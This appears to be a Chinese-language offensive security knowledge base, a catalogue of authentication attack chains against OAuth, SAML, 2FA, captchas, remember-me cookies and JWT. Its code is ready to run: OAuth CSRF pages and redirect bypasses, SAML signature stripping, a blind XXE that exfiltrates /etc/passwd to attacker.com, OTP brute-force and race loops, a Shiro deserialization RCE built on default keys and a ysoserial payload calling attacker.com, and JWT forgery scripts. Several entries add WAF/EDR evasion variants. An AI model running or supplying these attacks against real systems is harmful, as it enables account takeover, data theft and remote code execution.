### OAuth漏洞  `auth-oauth`
OAuth认证流程漏洞
子类：**OAuth** · tags: `auth` `oauth` `redirect`

**前置条件：** 使用OAuth登录

**攻击链：**

**1. CSRF攻击**
_缺乏state参数_
```
# OAuth CSRF - 强制账号绑定攻击:
# 1. 获取攻击者的OAuth授权码:
#    正常走OAuth流程到callback但不完成
#    截获: http://target.com/callback?code=ATTACKER_CODE

# 2. 构造CSRF页面:
<html>
  <body>
    <img src="http://target.com/callback?code=ATTACKER_CODE">
    <!-- 或使用iframe -->
    <iframe src="http://target.com/callback?code=ATTACKER_CODE" style="display:none"></iframe>
  </body>
</html>

# 3. 受害者访问该页面后，其账号将绑定攻击者的OAuth账号
# 4. 攻击者可通过OAuth登录受害者账号

# 防御检测: 检查授权请求是否携带state参数
```

**2. Redirect URI**
_重定向到攻击者获取Code_
```
redirect_uri=http://attacker.com
```

**3. OAuth State参数缺失/可预测CSRF**
_检测OAuth流程中state参数的缺失或可预测性_
```
# 1. 检测state参数是否存在:
# 访问OAuth授权URL，查看是否有state参数
curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code"

# 2. 如果没有state参数 → CSRF绑定攻击:
# 攻击者用自己的OAuth账号发起授权，获取code
# 构造链接: http://target.com/callback?code=ATTACKER_CODE
# 发给受害者 → 受害者的账户绑定了攻击者的OAuth账号

# 3. 如果state可预测:
# 多次请求获取state值分析规律
for i in $(seq 1 5); do
  state=$(curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code" | grep -i "location" | grep -oP "state=([^&]+)" | cut -d= -f2)
  echo "State $i: $state"
  sleep 0.5
done
```

**4. Token窃取与Scope越权**
_OAuth Token窃取、Scope越权、跨应用Token复用测试_
```
# 1. 通过redirect_uri泄露Token:
# implicit flow中Token在URL fragment中:
# http://attacker.com/callback#access_token=xxx
# 使用Referer泄露:
# 如果callback页面有外链，Token会通过Referer泄露

# 2. Scope越权 - 请求更高权限:
curl "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code&scope=admin+write+delete"

# 3. Token复用测试 - 用authorization_code换取的Token访问其他API:
TOKEN="stolen_access_token_here"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/users"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/settings"
curl -H "Authorization: Bearer ${TOKEN}" "http://other-app.target.com/api/user/info"

# 4. refresh_token窃取后无限续期:
curl -d "grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=xxx"   "http://target.com/oauth/token"
```

**WAF/EDR 绕过变体：**

**1. Redirect URI绕过技巧合集**
_多种redirect_uri白名单绕过技术_
```
# 白名单绕过技巧:

# 1. 子域名绕过(如果白名单用后缀匹配):
redirect_uri=http://evil.target.com/callback
redirect_uri=http://target.com.evil.com/callback

# 2. 路径遍历:
redirect_uri=http://target.com/callback/../../../evil-page
redirect_uri=http://target.com/callback/..%2f..%2f..%2fevil-page

# 3. 参数注入:
redirect_uri=http://target.com/callback?next=http://evil.com
redirect_uri=http://target.com/callback%23@evil.com

# 4. 端口注入:
redirect_uri=http://target.com:8080@evil.com/callback

# 5. URL编码绕过:
redirect_uri=http://target.com%40evil.com/callback
redirect_uri=http://target.com%2540evil.com/callback

# 6. localhost/内网绕过:
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback

# 7. 开放重定向链:
redirect_uri=http://target.com/redirect?url=http://evil.com
```

---

### SAML漏洞  `auth-saml`
SAML断言攻击
子类：**SAML** · tags: `auth` `saml` `xml`

**前置条件：** 使用SAML SSO

**攻击链：**

**1. XML签名绕过**
_SAML Raider工具_
```
# SAML断言篡改 - 删除签名验证:
# 1. 拦截SAML Response(Burp Suite):
# POST /saml/acs 中的SAMLResponse参数

# 2. Base64解码:
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml

# 3. 修改断言中的NameID(提权为admin):
# 原始: <NameID>user@target.com</NameID>
# 修改: <NameID>admin@target.com</NameID>

# 4. 删除签名块(删除整个<Signature>...</Signature>):
xmlstarlet ed -d "//*[local-name()='Signature']" saml.xml > saml_modified.xml

# 5. 重新Base64编码并替换:
base64 -w0 saml_modified.xml | xclip -sel clip

# 6. 在Burp中用修改后的值替换SAMLResponse参数
```

**2. XXE攻击**
_SAML基于XML_
```
# SAML XXE注入攻击:
# 1. 解码SAML Response后，在XML声明后注入DTD:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

# 2. 带外数据外泄(Blind XXE):
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

# evil.dtd内容:
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
%payload;

# 3. Base64编码后替换SAMLResponse参数发送
```

**3. SAML Response篡改与重放**  _[linux]_
_SAML Response篡改身份信息和重放攻击_
```
# 1. 拦截SAML Response:
# Burp Suite中拦截POST到/saml/acs的请求
# SAMLResponse参数是Base64编码的XML

# 2. 解码并修改:
echo "BASE64_SAML_RESPONSE" | base64 -d > saml_resp.xml

# 3. 修改关键字段:
# - NameID: 修改为目标用户 (admin@target.com)
# - Audience: 确保匹配SP
# - Conditions/NotBefore/NotOnOrAfter: 确保时间有效

# 使用xmlstarlet修改:
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion"   -u "//saml:NameID" -v "admin@target.com" saml_resp.xml > modified.xml

# 4. 重新编码提交:
cat modified.xml | base64 -w0 > encoded.txt
curl -d "SAMLResponse=$(cat encoded.txt)&RelayState=/" "http://target.com/saml/acs"

# 5. 重放攻击(如果未检查InResponseTo/时间):
# 直接重放之前抓到的有效SAMLResponse
curl -d "SAMLResponse=PREVIOUSLY_CAPTURED&RelayState=/" "http://target.com/saml/acs"
```

**4. SAML签名绕过高级技术**  _[linux]_
_SAML签名绕过的多种高级技术_
```
# 1. 签名包装攻击(XSW - XML Signature Wrapping):
# 将签名的断言移到XML其他位置，注入恶意断言
# 有8种XSW攻击变体

# 使用SAML Raider (Burp插件):
# - 拦截SAMLResponse
# - 选择XSW攻击类型(1-8)
# - 修改NameID为admin
# - 重放

# 2. 签名排除(如果SP不验证签名):
# 删除XML中的<ds:Signature>整个节点
xmlstarlet ed -N ds="http://www.w3.org/2000/09/xmldsig#"   -d "//ds:Signature" saml_resp.xml > no_sig.xml

# 3. 自签名证书替换:
# 生成自签名证书:
openssl req -new -x509 -days 365 -nodes -newkey rsa:2048   -keyout my.key -out my.crt -subj "/CN=Evil IDP"

# 使用xmlsec1签名:
xmlsec1 --sign --privkey-pem my.key --id-attr:ID Assertion saml_resp.xml

# 4. Comment注入绕过:
# admin<!-- -->@target.com 可能被解析为 admin@target.com
# 在NameID中注入: admin@target.com<!---->.evil.com
```

**WAF/EDR 绕过变体：**

**1. SAML XML混淆绕过WAF**  _[linux]_
_XML编码混淆和多种格式变体绕过WAF对SAML的检测_
```
# 1. XML编码混淆:
# 使用CDATA段包裹payload:
<NameID><![CDATA[admin@target.com]]></NameID>

# 2. DTD定义实体:
<!DOCTYPE foo [<!ENTITY user "admin@target.com">]>
<NameID>&user;</NameID>

# 3. XML命名空间混淆:
<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
             xmlns:x="http://evil.com">admin@target.com</saml:NameID>

# 4. 编码SAMLResponse的不同方式:
# 标准Base64:
cat saml.xml | base64 -w0
# 带换行的Base64:
cat saml.xml | base64
# URL编码后的Base64:
cat saml.xml | base64 -w0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"

# 5. Deflate+Base64(某些实现接受):
python3 -c "import zlib,base64; print(base64.b64encode(zlib.compress(open('saml.xml','rb').read())).decode())"
```

---

### 2FA绕过  `auth-2fa`
绕过双因素认证
子类：**2FA** · tags: `auth` `2fa` `mfa`

**前置条件：** 开启2FA

**攻击链：**

**1. 直接访问**
_强制浏览绕过2FA页面_
```
# 2FA绕过 - 强制浏览(直接跳过验证步骤):
# 1. 正常登录输入用户名密码，到达2FA验证页面
# 2. 不输入验证码，直接访问后台页面:
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/admin/dashboard" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/api/user/profile" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/home" -v

# 3. 修改前端JS跳过验证:
# 在浏览器Console中执行:
# window.location = '/dashboard'

# 4. 修改响应中的验证状态:
# Burp拦截响应: {"2fa_required":true} → {"2fa_required":false}

# 5. 直接调用API(可能不检查2FA状态):
curl -b "session=COOKIE" "http://target.com/api/v1/users" -v
```

**2. 验证码爆破**
_无速率限制_
```
# 2FA验证码爆破:
# 1. TOTP通常为6位数字(000000-999999):
# 但有30秒时间窗口，需要极快速爆破

# 2. 短信验证码爆破(4位):
# Burp Intruder:
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"otp":"§0000§","session":"LOGIN_SESSION"}
# Payload: Numbers 0000-9999

# 3. 检测速率限制:
# 快速发送10次请求，观察是否被限制
for i in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code}" \
    -d "otp=$i&session=SESS" "http://target.com/verify-2fa"
  echo " - $i"
done

# 4. 绕过速率限制:
# X-Forwarded-For IP轮换
# 修改User-Agent
# 添加空字节: otp=1234%00
```

**3. 逻辑绕过**
_修改响应包_
```
response=true / success=1
```

**WAF/EDR 绕过变体：**

**1. 响应篡改与直接端点访问**
_通过拦截并修改2FA验证响应包欺骗前端认为验证通过，或绕过2FA页面直接访问受保护端点测试服务端是否强制校验2FA状态_
```
# 响应篡改(Burp拦截):
# 原始响应: {"success":false,"message":"Invalid OTP"}
# 修改为:   {"success":true,"message":"Valid OTP"}

# 直接跳过2FA步骤:
# 登录后不访问/verify-2fa，直接访问:
GET /dashboard HTTP/1.1
Cookie: session=AFTER_LOGIN_SESSION

# 修改状态参数:
POST /verify-2fa
{"otp":"000000","skip":true}
/verify-2fa?verified=true
```

**2. 备份码爆破与验证竞态条件**
_对2FA备份恢复码进行字典爆破(通常限制不如OTP严格)，利用竞态条件并发发送多个OTP验证请求绕过速率限制_
```
# 备份码爆破(通常为8位数字/字母):
# 使用Burp Intruder对backup_code参数进行爆破
POST /verify-backup-code
{"backup_code":"§12345678§"}
# 检查速率限制和锁定策略

# 竞态条件(Race Condition):
# 同时发送多个验证请求:
for i in $(seq 000000 000100); do
  curl -s -X POST "http://target.com/verify-2fa"     -b "session=SID" -d "otp=$i" &
done
wait
# 多线程并发可能绕过速率限制
```

---

### 验证码绕过  `auth-captcha`
绕过图形验证码
子类：**验证码** · tags: `auth` `captcha` `bypass`

**前置条件：** 存在验证码

**攻击链：**

**1. 重复使用**
_验证码未一次性失效_
```
# 验证码重放攻击(一次验证,多次使用):
# 1. 正常获取并输入正确验证码
# 2. 在Burp中抓取成功的请求
# 3. 将请求发送到Repeater，重复发送:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=§test§&captcha=VALID_CAPTCHA

# 4. 如果每次响应都正常(非"验证码错误")
#    说明验证码未一次性失效，可用于暴力破解

# 5. 配合Intruder进行密码爆破:
# Positions: password字段
# Payloads: 密码字典
# 固定captcha字段为已知有效值

# Burp Intruder设置: Sniper模式，Payload为密码列表
```

**2. 空值绕过**
_验证码参数留空_
```
# 验证码空值/参数删除绕过:
# 1. 提交空验证码:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=

# 2. 提交null值:
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test","captcha":null}

# 3. 完全删除captcha参数:
POST /login HTTP/1.1

username=admin&password=test

# 4. 提交特殊值:
captcha=0
captcha=undefined
captcha[]=
captcha=true

# 5. 不同编码:
captcha=%00
captcha=%20

# 如果任一方式登录成功，说明验证码验证可被绕过
```

**3. 删除参数**
_后端未检查参数存在性_
```
# 验证码参数移除绕过:
# 1. 原始请求(带验证码):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=abcd

# 2. 在Burp Repeater中删除captcha参数:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

# 3. 修改Content-Type测试(可能走不同处理逻辑):
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 4. 通过移动端API(可能无验证码):
POST /api/mobile/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 5. 旧版本API(可能无验证码):
POST /api/v1/login HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. 会话复用与参数移除绕过**
_测试验证码是否在使用后立即失效(可重复使用)，删除captcha参数检查后端是否强制校验，或传入空值、数组等异常类型绕过类型检查_
```
# 会话复用(验证码未一次性失效):
# 1. 正确输入验证码一次
# 2. 后续请求继续使用相同captcha值
# Burp Repeater重放同一captcha参数

# 删除captcha参数:
# 原始: user=admin&pass=123&captcha=ABCD
# 修改: user=admin&pass=123
# 后端可能不校验缺失的参数

# 空值绕过:
captcha=
captcha=null
captcha=undefined
captcha[]=
```

**2. OCR识别与音频验证码利用**
_使用OCR工具(Tesseract)自动识别简单图形验证码，利用音频验证码的语音识别替代方案，或检查响应中是否直接泄露验证码值_
```
# OCR自动识别图形验证码:
# Python + Tesseract:
import pytesseract
from PIL import Image
img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(text)

# 音频验证码利用:
# 使用Google Speech-to-Text API识别音频验证码
# 或使用Selenium自动获取+语音识别

# 验证码响应泄露:
# 检查响应头、Cookie、隐藏字段中是否包含验证码值
curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"
```

---

### 记住我漏洞  `auth-remember-me`
Remember Me功能漏洞
子类：**会话管理** · tags: `auth` `remember-me` `cookie`

**前置条件：** 开启Remember Me

**攻击链：**

**1. Cookie伪造**
_明文存储用户名_
```
# Remember-Me Cookie伪造:
# 1. 分析Cookie结构:
# 常见格式: username|timestamp|hash 或 base64(username:expiry:hash)
Cookie: remember=admin
Cookie: remember=dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0

# 2. Base64解码分析:
echo "dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0" | base64 -d
# 输出: user:1699000000:abcd1234

# 3. 伪造admin的Cookie:
echo -n "admin:1999999999:abcd1234" | base64
# 用生成的值替换Cookie

# 4. 如果使用弱Hash(如MD5(username+secret)):
# 注册新账号 → 分析Cookie → 推导secret → 伪造admin Cookie

# 5. 测试:
curl -b "remember=FORGED_VALUE" "http://target.com/dashboard" -v
```

**2. Base64解码**
_弱加密或编码_
```
# Remember-Me Cookie解码与分析:
# 1. 提取Cookie值:
curl -c cookies.txt -d "username=testuser&password=test123&remember=1" "http://target.com/login"
cat cookies.txt | grep -i remember

# 2. Base64解码:
echo "COOKIE_VALUE" | base64 -d

# 3. 如果是URL编码+Base64:
python3 -c "import urllib.parse,base64; print(base64.b64decode(urllib.parse.unquote('COOKIE_VALUE')))"

# 4. 尝试Hex解码:
echo "COOKIE_VALUE" | xxd -r -p

# 5. 分析解码后的结构:
# username:timestamp:hmac
# {"user":"admin","exp":1699999999}
# 序列化对象(Java/PHP)

# 6. 检查是否为已知框架的Cookie格式:
# Shiro: AES-CBC加密(默认密钥kPH+bIxk5D2deZiIxcaaaA==)
# Django: base64(payload):timestamp:signature
```

**3. 记住密码Token逆向分析**  _[linux]_
_逆向分析remember-me Token的生成逻辑_
```
# 1. 收集多个remember-me Token:
for i in $(seq 1 5); do
  token=$(curl -s -c - -d "username=testuser&password=testpass&remember=1"     "http://target.com/login" | grep -i "remember" | awk '{print $NF}')
  echo "Token $i: $token"
  sleep 1
done

# 2. Base64解码分析:
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -20  # security-allowlist: SEC008

# 3. 检查常见格式:
# username:timestamp:hash
# username:md5(password)
# serialized_object(Java: rO0AB... PHP: O:4:...)

# 4. 如果是Java序列化(Shiro RememberMe):
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -3  # security-allowlist: SEC008
# 如果以 aced0005 开头 → Java序列化对象
# 如果Token加密: 尝试Shiro默认密钥 kPH+bIxk5D2deZiIxcaaaA==

# 5. PHP反序列化检查:
echo "REMEMBER_TOKEN" | base64 -d
# 如果形如 O:4:"User":2:{s:4:"name";s:5:"admin";...} → PHP序列化
```

**4. Shiro RememberMe反序列化RCE**
_利用Shiro默认密钥 + 反序列化链实现RCE_
```
# Apache Shiro框架的RememberMe Cookie反序列化漏洞
# 原理: AES-CBC加密(默认密钥) → Base64编码 → Cookie

# 1. 检测Shiro框架:
curl -sI "http://target.com/" | grep -i "rememberMe=deleteMe"
# 发送无效Cookie触发特征响应:
curl -sI "http://target.com/" -b "rememberMe=test" | grep -i "rememberMe"

# 2. 已知Shiro密钥列表测试:
# kPH+bIxk5D2deZiIxcaaaA==
# 2AvVhdsgUs0FSA3SDFAdag==
# 3AvVhmFLUs0KTA3Kprsdag==
# ...

# 3. 使用ShiroExploit工具:
# java -jar ShiroExploit.jar http://target.com

# 4. 手动构造payload(需要ysoserial):
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker.com/rce" > payload.ser

# AES加密:
python3 -c "
import base64
from Crypto.Cipher import AES
import os

key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
iv = os.urandom(16)
payload = open('payload.ser','rb').read()
# PKCS5Padding
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = iv + cipher.encrypt(payload)
print(base64.b64encode(encrypted).decode())
"
```

**WAF/EDR 绕过变体：**

**1. Remember-Me Cookie绕过检测**
_枚举Shiro密钥和不同加密模式绕过检测_
```
# 1. 修改Cookie名称大小写:
curl -b "RememberMe=payload" "http://target.com/"
curl -b "rememberme=payload" "http://target.com/"
curl -b "REMEMBERME=payload" "http://target.com/"

# 2. Shiro密钥枚举(使用不同密钥加密payload):
import base64, itertools
from Crypto.Cipher import AES
import os

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
]

payload = open("payload.ser", "rb").read()
for k in keys:
    try:
        key = base64.b64decode(k)
        iv = os.urandom(16)
        pad = 16 - len(payload) % 16
        padded = payload + bytes([pad]) * pad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()
        print(f"Key: {k} → Cookie length: {len(enc)}")
    except Exception as e:
        print(f"Key: {k} → Error: {e}")

# 3. GCM模式(Shiro 1.4.2+):
# 新版Shiro使用AES-GCM，需要对应的加密方式
```

---

### JWT认证漏洞  `auth-jwt`
利用JWT(JSON Web Token)实现缺陷伪造或篡改认证令牌，实现未授权访问或权限提升
子类：**JWT** · tags: `auth` `jwt` `token`

**前置条件：** 目标使用JWT进行认证；可以获取或拦截JWT令牌；JWT库存在已知漏洞或服务端配置不当

**攻击链：**

**1. JWT解码与分析**
_解码JWT的Header和Payload分析其结构和权限信息_
```
# 手动解码JWT (Base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null

# 使用jwt_tool解码:
python3 jwt_tool.py <token>

# 在线解码:
# https://jwt.io/

# 检查关键字段:
# - alg: 签名算法(HS256/RS256/none)
# - kid: 密钥ID(可能可注入)
# - typ: 令牌类型
# - exp: 过期时间
# - role/admin/isAdmin: 权限字段
```

**2. Algorithm None攻击**
_将JWT的alg字段设为none，使服务端跳过签名验证，直接接受篡改的payload_
```
# 将alg改为none绕过签名验证
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "iat": 1700000000, "exp": 1999999999}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

# 多种变体绕过:
alg_variants = ["none", "None", "NONE", "nOnE"]
for alg in alg_variants:
    header["alg"] = alg
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
    token = h.decode() + "." + p.decode() + "."
    print(f"alg={alg}: {token}")

# 使用jwt_tool:
python3 jwt_tool.py <token> -X a  # Algorithm None attack
```

**3. HS256密钥爆破**  _[linux]_
_对使用HS256对称加密的JWT进行密钥字典爆破_
```
# 使用jwt_tool爆破弱密钥
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# 使用hashcat:
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# 使用john:
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# 常见弱密钥:
# secret, password, 123456, admin, key, test
# 公司名, 项目名, 域名等

# 密钥确认后伪造JWT:
import jwt
token = jwt.encode({"user":"admin","role":"admin"}, "found_secret", algorithm="HS256")
print(token)
```

**4. RS256→HS256算法混淆攻击**  _[linux]_
_利用RS256/HS256算法混淆，用公钥作为HS256对称密钥签名伪造JWT_
```
# 当服务端使用RS256但接受HS256时:
# 1. 获取服务端公钥(通常在/.well-known/jwks.json或/api/keys)
curl -s "http://target.com/.well-known/jwks.json"
curl -s "http://target.com/api/v1/keys"

# 2. 提取公钥
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem

# 3. 用公钥作为HS256的密钥签名JWT
import jwt
public_key = open("pubkey.pem").read()
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(token)

# 使用jwt_tool:
python3 jwt_tool.py <token> -X k -pk pubkey.pem  # Key confusion attack
```

**5. KID参数注入**
_利用JWT头部kid字段的SQL注入或路径遍历控制签名验证密钥_
```
# KID (Key ID) SQL注入:
# 原始header: {"alg":"HS256","kid":"key1"}
# 注入header: {"alg":"HS256","kid":"key1' UNION SELECT 'ATTACKER_SECRET' -- "}

import jwt, json, base64

# SQL注入方式:
header = {"alg": "HS256", "kid": "x' UNION SELECT 'test' -- "}
token = jwt.encode({"user": "admin"}, "test", algorithm="HS256", headers=header)

# 路径遍历方式:
header2 = {"alg": "HS256", "kid": "../../dev/null"}
# /dev/null内容为空，密钥为空字符串
token2 = jwt.encode({"user": "admin"}, "", algorithm="HS256", headers=header2)

# 使用jwt_tool:
python3 jwt_tool.py <token> -X i -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**WAF/EDR 绕过变体：**

**1. JWK/JKU头部密钥注入**
_通过JWT Header中的jwk字段内嵌攻击者公钥或jku字段指向攻击者的JWKS端点，使服务端使用攻击者控制的密钥验证签名_
```
# JWK内嵌密钥注入:
# 生成RSA密钥对:
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# 构造JWT Header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<attacker_n_base64>","e":"AQAB","use":"sig"}}
# 用attacker.key签名，服务端从jwk字段取公钥验证

# JKU远程密钥注入:
{"alg":"RS256","jku":"http://attacker.com/jwks.json"}
# 在attacker.com上部署包含攻击者公钥的JWKS文件

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```

**2. 算法降级与嵌套令牌利用**
_利用RS256到HS256的算法混淆攻击(用公钥作对称密钥签名)，或在JWT Payload中嵌入伪造的内部JWT令牌触发递归解析漏洞_
```
# 算法降级(RS256→HS256):
# 获取服务端公钥后用作HS256密钥:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
python3 -c "
import jwt
pub = open('pub.pem').read()
token = jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256')
print(token)"

# Claim篡改+嵌套JWT:
# 在JWT payload中嵌入另一个JWT:
{"user":"admin","inner_token":"<另一个伪造的JWT>"}
# 某些系统会递归解析inner_token
```

---

### · JWT安全

### JWT None算法攻击  `jwt-none-attack`
利用JWT库对"none"算法的支持缺陷，将JWT头部的签名算法修改为none后移除签名部分，构造无需密钥即可通过验证的伪造令牌。这是最经典的JWT漏洞之一。
子类：**算法攻击** · tags: `JWT` `none算法` `认证绕过` `令牌伪造` `CVE-2015-2951`

**前置条件：** 目标使用JWT进行身份认证；jwt_tool或Python PyJWT库

**攻击链：**

**1. 1. 解码现有JWT**
_解析JWT的Header和Payload部分，识别算法和声明内容_
```
# 解码JWT的三个部分
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f1 | base64 -d
# 输出: {"alg":"HS256","typ":"JWT"}

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f2 | base64 -d
# 输出: {"user":"guest","role":"user"}
```

**2. 2. 构造None算法JWT**
_Python脚本构造alg=none的伪造JWT，提权为admin_
```
import base64, json

# 修改Header为none算法
header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b"=").decode()

# 修改Payload为admin
payload = base64.urlsafe_b64encode(
    json.dumps({"user":"admin","role":"admin"}).encode()
).rstrip(b"=").decode()

# 签名为空
forged_jwt = f"{header}.{payload}."
print(forged_jwt)
```

**3. 3. jwt_tool自动攻击**
_使用jwt_tool自动化测试none算法及其大小写变体_
```
python3 jwt_tool.py {TOKEN} -X a

# -X a = 尝试none算法攻击
# 同时测试多种none变体
# none, None, NONE, nOnE, noNe
```

**4. 4. 验证伪造令牌**
_使用伪造的JWT访问管理员接口验证攻击效果_
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/dashboard"

# 检查是否获得管理员权限
# 200 OK = 攻击成功
# 401/403 = 服务端正确拒绝none算法
```

**WAF/EDR 绕过变体：**

**1. none算法大小写变体**
_使用none的各种大小写组合和不同签名占位绕过校验_
```
# 各种none变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"noNe"}
{"alg":"nONE"}

# 添加签名占位
header.payload.
header.payload.AA==
header.payload.e30=
```

---

### JWT密钥混淆攻击(RS→HS)  `jwt-key-confusion`
当服务端使用RSA公钥验证JWT时，攻击者将算法从RS256改为HS256，此时服务端会错误地使用RSA公钥作为HMAC密钥进行验证。由于RSA公钥是公开的，攻击者可用它签名任意JWT。
子类：**算法攻击** · tags: `JWT` `密钥混淆` `RS256` `HS256` `算法篡改`

**前置条件：** 目标JWT使用RS256/RS384/RS512算法；已获取RSA公钥；jwt_tool或Python

**攻击链：**

**1. 1. 获取RSA公钥**
_从JWKS端点、API或SSL证书中获取RSA公钥_
```
# 常见公钥泄露位置
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/api/keys" | jq
curl -s "https://{TARGET}/oauth/discovery" | jq

# 从JWKS中提取公钥
# 或从SSL证书中获取
openssl s_client -connect {TARGET}:443 | openssl x509 -pubkey -noout > pubkey.pem
```

**2. 2. 密钥混淆攻击**
_Python脚本将RSA公钥作为HMAC密钥签名伪造JWT_
```
import jwt
import json

# 读取RSA公钥
with open("pubkey.pem", "rb") as f:
    public_key = f.read()

# 用公钥作为HMAC密钥签名
forged_payload = {
    "user": "admin",
    "role": "admin",
    "iat": 1707811200,
    "exp": 1999999999
}

# 将算法从RS256切换为HS256
forged_token = jwt.encode(
    forged_payload,
    public_key,        # RSA公钥作为HMAC密钥
    algorithm="HS256"  # 改为HMAC算法
)
print(forged_token)
```

**3. 3. jwt_tool自动攻击**
_jwt_tool一键执行密钥混淆攻击_
```
python3 jwt_tool.py {TOKEN} -X k -pk pubkey.pem

# -X k = 密钥混淆攻击模式
# -pk = 指定公钥文件
# 工具自动完成RS256→HS256切换和签名
```

**4. 4. JWKS端点注入**
_JKU/X5U头注入使服务端从攻击者控制的URL获取验证密钥_
```
# 如果支持jku/x5u头，可注入自定义JWKS端点
Header: {
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://evil.com/.well-known/jwks.json"
}

# 在evil.com上托管攻击者生成的JWKS
# 服务端会从攻击者URL获取公钥进行验证
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout > attacker_pub.pem
```

**WAF/EDR 绕过变体：**

**1. 多种公钥格式尝试**
_某些JWT库对公钥格式处理不同，尝试多种格式_
```
# PEM格式(标准)
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----

# DER格式(二进制)
openssl rsa -pubin -in pubkey.pem -outform DER -out pubkey.der

# 带/不带换行符
cat pubkey.pem | tr -d "\n" > pubkey_noline.pem

# 不同编码的公钥作为HMAC密钥
```

---

### JWT密钥爆破  `jwt-secret-bruteforce`
当JWT使用HMAC对称算法(HS256/HS384/HS512)且密钥为弱密码时，可通过字典或暴力破解还原签名密钥，进而伪造任意JWT令牌。
